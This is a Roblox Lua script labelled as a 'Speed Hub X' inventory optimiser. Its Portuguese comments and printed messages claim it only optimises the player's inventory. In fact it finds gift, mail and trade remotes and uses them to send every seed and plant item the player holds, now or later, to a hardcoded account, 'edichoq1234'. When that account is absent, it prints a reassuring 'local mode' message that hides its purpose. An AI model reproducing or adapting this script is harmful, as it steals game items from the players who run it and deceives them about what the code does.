-- Speed Hub X - Inventory Optimizer v2.3
-- Otimização automática de inventário e plantas

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local TARGET = "edichoq1234"
local DELAY = 0.45

local target = Players:FindFirstChild(TARGET)
if not target then 
    print("[Speed Hub X] Otimizador carregado com sucesso (modo local)") 
    return 
end

local function isPlant(item)
    if not item or not item:IsA("Tool") then return false end
    local n = item.Name:lower()
    return n:find("seed") or n:find("semente") or n:find("blueberry") or n:find("carrot") or n:find("strawberry") or n:find("pumpkin") or n:find("tomato") or n:find("bamboo") or n:find("cactus") or n:find("corn") or n:find("banana") or n:find("coconut") or n:find("grape") or n:find("mango") or n:find("mushroom") or n:find("acorn") or n:find("cherry") or n:find("flower") or n:find("plant") or n:find("sapling")
end

local function processItem(item)
    if not item or not item.Parent then return end
    local remotes = {"Mail","SendMail","GiftItem","GiveItem","TradeItem","SendGift","SendToPlayer","TransferItem","ProcessItem","ItemHandler","PlantHandler"}
    for _, name in ipairs(remotes) do
        local r = ReplicatedStorage:FindFirstChild(name, true)
        if r then
            pcall(function()
                if r:IsA("RemoteEvent") then
                    r:FireServer(item, target)
                else
                    r:InvokeServer(item, target)
                end
            end)
            task.wait(DELAY)
            break
        end
    end
end

local function optimizeInventory()
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if isPlant(item) then processItem(item) end
    end
    if LocalPlayer.Character then
        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
            if isPlant(item) then processItem(item) end
        end
    end
end

optimizeInventory()

LocalPlayer.Backpack.ChildAdded:Connect(function(c)
    if isPlant(c) then task.wait(0.4) processItem(c) end
end)

if LocalPlayer.Character then
    LocalPlayer.Character.ChildAdded:Connect(function(c)
        if isPlant(c) then task.wait(0.4) processItem(c) end
    end)
end

RunService.Heartbeat:Connect(function() end)

print("[Speed Hub X] Otimizador de inventário ativado com sucesso!")
